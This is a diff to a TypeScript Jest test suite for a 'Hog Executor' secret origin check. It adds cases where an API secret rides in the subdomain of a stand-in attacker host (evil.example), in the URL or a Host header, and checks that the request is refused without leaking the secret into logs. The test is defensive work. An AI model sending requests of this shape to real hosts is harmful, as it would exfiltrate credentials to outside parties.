@@ -1818,6 +1818,8 @@ describe('Hog Executor', () => {
         describe('secret origin check', () => {
             const SECRET = 'sk_test_origin_0000000000'
             const HOST_SECRET = 'Sk_Test_Origin_0000000000'
+            // Shorter than the value scan matches, so only a named secret input carries it.
+            const SHORT_SECRET = 'Qz7x9k'
 
             const readCount = async (outcome: string, mode: string): Promise<number> => {
                 const metric = await secretOriginCheckCounter.get()
@@ -1830,6 +1832,7 @@ describe('Hog Executor', () => {
             type Carry =
                 | 'body'
                 | 'secret_headers'
+                | 'secret_header_value'
                 | 'header_name'
                 | 'aws_sigv4'
                 | 'standard_webhooks'
@@ -1865,6 +1868,10 @@ describe('Hog Executor', () => {
                         },
                     },
                     header_name: { params: { headers: { [secret]: '1' } }, inputs: { api_key: secret } },
+                    secret_header_value: {
+                        params: { secret_headers_input: 'api_key' },
+                        inputs: { api_key: { 'X-Api-Key': secret } },
+                    },
                     secret_headers: {
                         params: { secret_headers_input: 'api_key' },
                         inputs: { api_key: { Authorization: `Bearer ${secret}` } },
@@ -2138,18 +2145,33 @@ describe('Hog Executor', () => {
                 expect(result.error === undefined).toBe(sent)
             })
 
-            it.each<{ carriedBy: string; url: string; headers: Record<string, string> }>([
-                { carriedBy: 'the URL', url: `https://${HOST_SECRET}.evil.example/`, headers: {} },
+            it.each<{ carriedBy: string; url: string; headers: Record<string, string>; carry: Carry; secret: string }>([
+                {
+                    carriedBy: 'the URL',
+                    url: `https://${HOST_SECRET}.evil.example/`,
+                    headers: {},
+                    carry: 'body',
+                    secret: HOST_SECRET,
+                },
                 {
                     carriedBy: 'a Host header',
                     url: 'https://good.example/',
                     headers: { Host: `${HOST_SECRET}.evil.example` },
+                    carry: 'body',
+                    secret: HOST_SECRET,
+                },
+                {
+                    carriedBy: 'the URL as a short named secret header',
+                    url: `https://${SHORT_SECRET}.evil.example/`,
+                    headers: {},
+                    carry: 'secret_header_value',
+                    secret: SHORT_SECRET,
                 },
             ])(
                 'enforce: leaves a secret in a host from $carriedBy out of the refusal and the warning',
-                async ({ url, headers }) => {
+                async ({ url, headers, carry, secret }) => {
                     const warn = jest.spyOn(logger, 'warn')
-                    const invocation = await secretInvocation(url, ['https://good.example'], 'body', HOST_SECRET)
+                    const invocation = await secretInvocation(url, ['https://good.example'], carry, secret)
                     ;(invocation.queueParameters as CyclotronInvocationQueueParametersFetchType).headers = headers
 
                     const result = await enforcingExecutor().executeFetch(invocation)
@@ -2159,7 +2181,7 @@ describe('Hog Executor', () => {
                     ])
                     expect(warn.mock.calls.some(([, , context]) => context?.inputKey === 'api_key')).toBe(true)
                     expect(JSON.stringify([result.logs, warn.mock.calls]).toLowerCase()).not.toContain(
-                        HOST_SECRET.toLowerCase()
+                        secret.toLowerCase()
                     )
                 }
             )
